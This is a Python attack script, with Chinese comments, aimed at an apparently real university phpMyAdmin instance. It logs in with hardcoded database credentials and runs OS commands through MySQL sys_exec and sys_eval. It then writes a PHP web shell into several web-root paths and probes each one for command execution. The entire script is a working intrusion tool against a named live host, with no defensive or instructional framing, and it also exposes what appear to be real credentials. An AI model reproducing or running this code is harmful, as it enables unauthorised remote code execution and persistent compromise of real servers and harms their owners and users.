#!/usr/bin/env python3
import requests
import re
import urllib3
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text).group(1)

print(f"[+] Token: {token}")

# 使用sys_exec执行命令
print("[*] 使用sys_exec执行命令...")

# 先测试命令执行
sql = "SELECT sys_exec('id');"
sql_data = {"sql_query": sql, "db": "mysql"}
resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)

print(f"[*] 命令执行响应: {resp.text[:500]}")

# 写入shell
print("[*] 写入shell...")
sql = "SELECT sys_exec('echo \"<?php system(\\$_GET[c]); ?>\" > /var/www/html/enmeeting/shell.php');"
sql_data = {"sql_query": sql, "db": "mysql"}
resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)

time.sleep(2)
test_shell = requests.get("https://olympic.su.ac.th/enmeeting/shell.php?c=id", verify=False, timeout=5)
if "uid=" in test_shell.text:
    print(f"[+] Shell获取成功: https://olympic.su.ac.th/enmeeting/shell.php?c=id")
    exit(0)

# 尝试其他路径
write_paths = [
    "/var/www/html/shell.php",
    "/var/www/html/enmeeting/s.php",
]

for write_path in write_paths:
    sql = f"SELECT sys_exec('echo \"<?php system(\\$_GET[c]); ?>\" > {write_path}');"
    sql_data = {"sql_query": sql, "db": "mysql"}
    session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
    
    time.sleep(1)
    http_path = write_path.replace("/var/www/html", "")
    test_url = f"https://olympic.su.ac.th{http_path}?c=id"
    test_resp = requests.get(test_url, verify=False, timeout=5)
    if "uid=" in test_resp.text:
        print(f"[+] Shell获取成功: {test_url}")
        exit(0)

# 尝试sys_eval
print("[*] 尝试sys_eval...")
sql = "SELECT sys_eval('id');"
sql_data = {"sql_query": sql, "db": "mysql"}
resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)

if "uid=" in resp.text:
    print("[+] sys_eval命令执行成功!")
    sql = "SELECT sys_eval('echo \"<?php system(\\$_GET[c]); ?>\" > /var/www/html/enmeeting/shell.php');"
    sql_data = {"sql_query": sql, "db": "mysql"}
    session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
    
    time.sleep(2)
    test_shell = requests.get("https://olympic.su.ac.th/enmeeting/shell.php?c=id", verify=False, timeout=5)
    if "uid=" in test_shell.text:
        print(f"[+] Shell获取成功: https://olympic.su.ac.th/enmeeting/shell.php?c=id")
        exit(0)

print("[-] sys_exec/sys_eval利用失败")
